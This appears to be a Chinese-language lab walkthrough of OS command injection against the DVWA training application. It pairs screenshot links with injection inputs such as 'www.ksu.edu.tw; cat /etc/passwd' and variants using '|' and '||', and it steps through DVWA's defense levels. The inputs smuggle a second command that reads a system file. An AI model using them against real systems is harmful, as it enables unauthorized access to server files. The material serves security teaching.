
# 正常執行功能: www.ksu.edu.tw
![DVWA_1_1.png](DVWA_1_1.png)

![DVWA_1_2.png](DVWA_1_2.png)

# 攻擊1:www.ksu.edu.tw; cat /etc/passwd

![DVWA_1_3.png](DVWA_1_3.png)

![DVWA_1_4.png](DVWA_1_4.png)

### 原始碼分析 防禦指數 0:毫無作為
![DVWA_1_5.png](DVWA_1_5.png)

### 作業系統指令串接 == > Windows: &&  Linux: ;
![DVWA_1_6.png](DVWA_1_6.png)


# 防禦1:中階防禦 
![DVWA_1_7.png](DVWA_1_7.png)

# 設定成medium

![DVWA_1_8.png](DVWA_1_8.png)

# 攻擊1:www.ksu.edu.tw; cat /etc/passwd  == > 攻擊失敗!

![DVWA_1_9.png](DVWA_1_9.png)

# 攻擊2: 127.0.0.1 |  cat /etc/passwd
![DVWA_1_10.png](DVWA_1_10.png)
# 防禦2:高階防禦

![DVWA_1_11.png](DVWA_1_11.png)
# 攻擊3: 127.0.0.1 ||  cat /etc/passwd
![DVWA_1_12.png](DVWA_1_12.png)
# 防禦3:完美防禦(Impossible)
![DVWA_1_13.png](DVWA_1_13.png)


